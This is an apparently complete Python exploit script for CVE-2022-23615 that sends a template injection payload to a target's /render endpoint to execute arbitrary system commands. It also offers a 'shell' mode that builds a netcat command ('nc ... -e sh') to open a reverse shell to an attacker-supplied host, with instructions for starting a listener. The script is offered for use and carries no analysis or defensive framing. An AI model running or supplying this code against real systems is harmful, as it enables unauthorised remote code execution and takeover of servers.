#!/usr/bin/python

import requests

def test_connection(func_host):
    test = requests.post(func_host,data={'template':'test'})
    if test.status_code == 200:
        print('[*] Host is acseesible. Trying to send payload')
    else:
        print('[!] Host not available or does not exist')


print('[*] This is an exploit for CVE-2022-23615')
print('[*] Please specify host ip:port or domain:port')
host =str(input('[>] Host: ',))
host= 'http://'+host+'/render'
print('[*] Specify command what you want to be executed once')
print('[*] Or print "shell" to drop a reverse shell')
command = str(input('[>] Command: ',))
if command == 'shell':
    print('[?] Please specify shell host (without port)')
    atck_ip = input('[>] Your host: ',)
    print('[*] Please specify port')
    atck_port =str(input('[>] Port for shell: ',))
    command = 'nc '+atck_ip+' '+atck_port+' -e sh'
    input('[*] Please open handler with specified port\n[*] Example: nc -lnvp '+atck_port+'\n[>] Input anything to continue: ')
payload = '{'+'{'+'['+"'"+command+"'"+','+"''"+']'+'|sort('+"'system')"+'}'+'}'
#print(payload) # Debug
test_connection(host)
req = requests.post(host, data={'template': {payload}})
render = req.text.replace('Array','[!] Program Exited')
print(render)

